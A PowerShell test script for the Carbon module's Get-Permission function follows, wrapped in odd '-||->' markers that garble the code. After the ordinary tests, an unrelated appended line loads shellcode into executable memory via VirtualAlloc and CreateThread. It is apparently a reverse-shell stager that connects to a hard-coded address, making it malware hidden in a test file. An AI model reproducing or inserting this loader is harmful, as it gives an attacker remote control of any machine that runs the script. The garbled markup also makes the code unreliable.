











 -||-> $user = 'CarbonTestUser1' <-||- 
 -||-> $group1 = 'CarbonTestGroup1' <-||- 
 -||-> $password = 'a1z2b3y4!' <-||- 
 -||-> $containerPath = $null <-||- 
 -||-> $childPath = $null <-||- 

 -||-> function Start-TestFixture
{
     -||-> & ( -||-> Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 
} <-||- 

 -||-> function Start-Test
{
     -||-> Install-User -Username $user -Password $password -Description 'Carbon test user 1' <-||- 
     -||-> Install-Group -Name $group1 -Description 'Carbon test group 1' <-||- 

     -||-> $containerPath = 'Carbon-Test-GetPermissions-{0}' -f ( -||-> [IO.Path]::GetRandomFileName() <-||- ) <-||- 
     -||-> $containerPath =  -||-> Join-Path $env:Temp $containerPath <-||-  <-||- 
    
     -||-> $null =  -||-> New-Item $containerPath -ItemType Directory <-||-  <-||- 
     -||-> Grant-Permission -Path $containerPath -Identity $group1 -Permission Read <-||- 
    
     -||-> $childPath =  -||-> Join-Path $containerPath 'Child1' <-||-  <-||- 
     -||-> $null =  -||-> New-Item $childPath -ItemType File <-||-  <-||- 
     -||-> Grant-Permission -Path $childPath -Identity $user -Permission Read <-||- 
} <-||- 

 -||-> function Test-ShouldGetPermissions
{
     -||-> $perms =  -||-> Get-Permission -Path $childPath <-||-  <-||- 
     -||-> Assert-NotNull $perms <-||- 
     -||-> $group1Perms =  -||-> $perms | Where-Object {  -||-> $_.IdentityReference.Value -like "*\$group1" <-||-  } <-||-  <-||- 
     -||-> Assert-Null $group1Perms <-||- 
    
     -||-> $userPerms =  -||-> $perms | Where-Object {  -||-> $_.IdentityReference.Value -like "*\$user" <-||-  } <-||-  <-||- 
     -||-> Assert-NotNull $userPerms <-||- 
     -||-> Assert-True ( -||-> $userPerms -is [Security.AccessControl.FileSystemAccessrule] <-||- ) <-||- 
} <-||- 

 -||-> function Test-ShouldGetInheritedPermissions
{
     -||-> $perms =  -||-> Get-Permission -Path $childPath -Inherited <-||-  <-||- 
     -||-> Assert-NotNull $perms <-||- 
     -||-> $group1Perms =  -||-> $perms | Where-Object {  -||-> $_.IdentityReference.Value -like "*\$group1" <-||-  } <-||-  <-||- 
     -||-> Assert-NotNull $group1Perms <-||- 
     -||-> Assert-True ( -||-> $group1Perms -is [Security.AccessControl.FileSystemAccessrule] <-||- ) <-||- 
    
     -||-> $userPerms =  -||-> $perms | Where-Object {  -||-> $_.IdentityReference.Value -like "*\$user" <-||-  } <-||-  <-||- 
     -||-> Assert-NotNull $userPerms <-||- 
     -||-> Assert-True ( -||-> $userPerms -is [Security.AccessControl.FileSystemAccessrule] <-||- ) <-||- 
} <-||- 

 -||-> function Test-ShouldGetSpecificUserPermissions
{
     -||-> $perms =  -||-> Get-Permission -Path $childPath -Identity $group1 <-||-  <-||- 
     -||-> Assert-Null $perms <-||- 
    
     -||-> $perms = @(  -||-> Get-Permission -Path $childPath -Identity $user <-||-  ) <-||- 
     -||-> Assert-NotNull $perms <-||- 
     -||-> Assert-Equal 1 $perms.Length <-||- 
     -||-> Assert-NotNull $perms[0] <-||- 
     -||-> Assert-True ( -||-> $perms[0] -is [Security.AccessControl.FileSystemAccessrule] <-||- ) <-||- 
} <-||- 

 -||-> function Test-ShouldGetSpecificUsersInheritedPermissions
{
     -||-> $perms =  -||-> Get-Permission -Path $childPath -Identity $group1 -Inherited <-||-  <-||- 
     -||-> Assert-NotNull $perms <-||- 
     -||-> Assert-True ( -||-> $perms -is [Security.AccessControl.FileSystemAccessRule] <-||- ) <-||- 
} <-||- 

 -||-> function Test-ShouldGetPermissionsOnRegistryKey
{
     -||-> $perms =  -||-> Get-Permission -Path 'hkcu:\' <-||-  <-||- 
     -||-> Assert-NotNull $perms <-||- 
     -||-> $perms | ForEach-Object {
         -||-> Assert-True ( -||-> $_ -is [Security.AccessControl.RegistryAccessRule] <-||- ) <-||- 
    } <-||- 
} <-||- 

 -||-> function Test-ShouldGetPrivateCertPermission
{
     -||-> $foundPermission = $false <-||- 
     -||-> Get-ChildItem -Path 'cert:\*\*' -Recurse |
        Where-Object {  -||-> -not $_.PsIsContainer <-||-  } |
        Where-Object {  -||-> $_.HasPrivateKey <-||-  } |
        Where-Object {  -||-> $_.PrivateKey <-||-  } |
        ForEach-Object {  -||-> Join-Path -Path 'cert:' -ChildPath ( -||-> Split-Path -NoQualifier -Path $_.PSPath <-||- ) <-||-  } |
        ForEach-Object {  -||-> Get-Permission -Path $_ <-||-  } |
        ForEach-Object {
             -||-> $foundPermission = $true <-||- 
             -||-> Assert-NotNull $_ <-||- 
             -||-> Assert-Is $_ ( -||-> [Security.AccessControl.CryptoKeyAccessRule] <-||- ) <-||- 
        } <-||- 
     -||-> Assert-True $foundPermission <-||- 
} <-||- 

 -||-> function Test-ShouldGetSpecificIdentityCertPermission
{
     -||-> Get-ChildItem -Path 'cert:\*\*' -Recurse |
        Where-Object {  -||-> -not $_.PsIsContainer <-||-  } |
        Where-Object {  -||-> $_.HasPrivateKey <-||-  } |
        Where-Object {  -||-> $_.PrivateKey <-||-  } |
        ForEach-Object {  -||-> Join-Path -Path 'cert:' -ChildPath ( -||-> Split-Path -NoQualifier -Path $_.PSPath <-||- ) <-||-  } |
        ForEach-Object { 
             -||-> [object[]]$rules =  -||-> Get-Permission -Path $_ <-||-  <-||- 
             -||-> foreach( $rule in  -||-> $rules <-||-  )
            {
                 -||-> [object[]]$identityRule =  -||-> Get-Permission -Path $_ -Identity $rule.IdentityReference.Value <-||-  <-||- 
                 -||-> Assert-NotNull $identityRule <-||- 
                 -||-> Assert-True ( -||-> $identityRule.Count -le $rules.Count <-||- ) $ <-||- 
            } <-||- 
        } <-||- 
} <-||- 


 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z =  -||-> \xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3 <-||-  <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



